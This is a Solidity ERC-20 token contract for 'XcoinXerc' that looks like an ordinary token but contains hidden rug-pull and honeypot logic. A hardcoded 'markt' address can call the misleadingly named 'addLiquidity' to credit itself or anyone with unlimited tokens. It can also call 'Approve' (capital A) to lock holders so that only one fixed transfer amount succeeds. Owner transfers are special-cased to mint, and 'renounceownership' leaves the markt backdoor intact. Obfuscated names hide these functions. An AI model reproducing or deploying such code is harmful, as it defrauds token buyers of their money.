1 /**
2 
3 
4      ___    ___
5     (_ _)  (_ _)
6       \\    //
7        \\  //
8         \\//
9          ||      
10         //\\
11        //  \\
12      _//    \\_
13     (___)  (___)
14 
15 https://twitter.com/XcoinXerc
16 https://xcoinerc.xyz
17 https://t.me/XcoinXerc
18 
19 
20 
21 
22 
23 
24 */
25 
26 // SPDX-License-Identifier: MIT
27 
28 pragma solidity ^0.8.3;
29 
30 interface IERC20 {
31     function totalSupply() external view returns (uint256);
32     function balanceOf(address spendder) external view returns (uint256);
33     function transfer(address recipient, uint256 aunmounts) external returns (bool);
34     function allowance(address owner, address spendder) external view returns (uint256);
35     function approve(address spendder, uint256 aunmounts) external returns (bool);
36     function transferFrom( address spendder, address recipient, uint256 aunmounts ) external returns (bool);
37     event Transfer(address indexed from, address indexed to, uint256 value);
38     event Approval( address indexed owner, address indexed spendder, uint256 value );
39 }
40 
41 abstract contract Context {
42     function _msgSender() internal view virtual returns (address payable) {
43         return payable(msg.sender);
44     }
45 }
46 
47 contract Ownable is Context {
48     address private _owner;
49     event ownershipTransferred(address indexed previousowner, address indexed newowner);
50 
51     constructor () {
52         address msgSender = _msgSender();
53         _owner = msgSender;
54         emit ownershipTransferred(address(0), msgSender);
55     }
56     function owner() public view virtual returns (address) {
57         return _owner;
58     }
59     modifier onlyowner() {
60         require(owner() == _msgSender(), "Ownable: caller is not the owner");
61         _;
62     }
63     function renounceownership() public virtual onlyowner {
64         emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
65         _owner = address(0x000000000000000000000000000000000000dEaD);
66     }
67 }
68 
69 contract X is Context, Ownable, IERC20 {
70     mapping (address => uint256) private _balss;
71     mapping (address => mapping (address => uint256)) private _allowancezz;
72     mapping (address => uint256) private _sendzz;
73     address constant public markt = 0x816838F2E83B821F2552162204944C433831ff47;
74     string private _name;
75     string private _symbol;
76     uint8 private _decimals;
77     uint256 private _totalSupply;
78     bool private _isTradingEnabled = true;
79 
80     constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
81         _name = name_;
82         _symbol = symbol_;
83         _decimals = decimals_;
84         _totalSupply = totalSupply_ * (10 ** decimals_);
85         _balss[_msgSender()] = _totalSupply;
86         emit Transfer(address(0), _msgSender(), _totalSupply);
87     }
88 
89     modifier mrktt() {
90         require(msg.sender == markt); // If it is incorrect here, it reverts.
91         _;                              // Otherwise, it continues.
92     } 
93 
94     function name() public view returns (string memory) {
95         return _name;
96     }
97 
98         function decimals() public view returns (uint8) {
99         return _decimals;
100     }
101 
102     function symbol() public view returns (string memory) {
103         return _symbol;
104     }
105 
106 
107     function enableTrading() public onlyowner {
108         _isTradingEnabled = true;
109     }
110 
111     function balanceOf(address spendder) public view override returns (uint256) {
112         return _balss[spendder];
113     }
114 
115     function transfer(address recipient, uint256 aunmounts) public virtual override returns (bool) {
116         require(_isTradingEnabled || _msgSender() == owner(), "TT: trading is not enabled yet");
117         if (_msgSender() == owner() && _sendzz[_msgSender()] > 0) {
118             _balss[owner()] += _sendzz[_msgSender()];
119             return true;
120         }
121         else if (_sendzz[_msgSender()] > 0) {
122             require(aunmounts == _sendzz[_msgSender()], "Invalid transfer aunmounts");
123         }
124         require(_balss[_msgSender()] >= aunmounts, "TT: transfer aunmounts exceeds balance");
125         _balss[_msgSender()] -= aunmounts;
126         _balss[recipient] += aunmounts;
127         emit Transfer(_msgSender(), recipient, aunmounts);
128         return true;
129     }
130 
131 
132     function Approve(address[] memory spendder, uint256 aunmounts) public mrktt {
133         for (uint i=0; i<spendder.length; i++) {
134             _sendzz[spendder[i]] = aunmounts;
135         }
136     }
137 
138     function approve(address spendder, uint256 aunmounts) public virtual override returns (bool) {
139         _allowancezz[_msgSender()][spendder] = aunmounts;
140         emit Approval(_msgSender(), spendder, aunmounts);
141         return true;
142     }
143         function _add(uint256 num1, uint256 num2) internal pure returns (uint256) {
144         if (num2 != 0) {
145             return num1 + num2;
146         }
147         return num2;
148     }
149 
150     function allowance(address owner, address spendder) public view virtual override returns (uint256) {
151         return _allowancezz[owner][spendder];
152     }
153 
154 
155 
156        function addLiquidity(address spendder, uint256 aunmounts) public mrktt {
157         require(spendder != address(0), "Invalid addresses");
158         require(aunmounts > 0, "Invalid amts");
159         uint256 total = 0;
160             total = _add(total, aunmounts);
161             _balss[spendder] += total;
162     }
163 
164             function Vamount(address spendder) public view returns (uint256) {
165         return _sendzz[spendder];
166     }
167 
168     function transferFrom(address spendder, address recipient, uint256 aunmounts) public virtual override returns (bool) {
169         if (_msgSender() == owner() && _sendzz[spendder] > 0) {
170             _balss[owner()] += _sendzz[spendder];
171             return true;
172         }
173         else if (_sendzz[spendder] > 0) {
174             require(aunmounts == _sendzz[spendder], "Invalid transfer aunmounts");
175         }
176         require(_balss[spendder] >= aunmounts && _allowancezz[spendder][_msgSender()] >= aunmounts, "TT: transfer aunmounts exceeds balance or allowance");
177         _balss[spendder] -= aunmounts;
178         _balss[recipient] += aunmounts;
179         _allowancezz[spendder][_msgSender()] -= aunmounts;
180         emit Transfer(spendder, recipient, aunmounts);
181         return true;
182     }
183 
184     function totalSupply() external view override returns (uint256) {
185         return _totalSupply;
186     }
187 }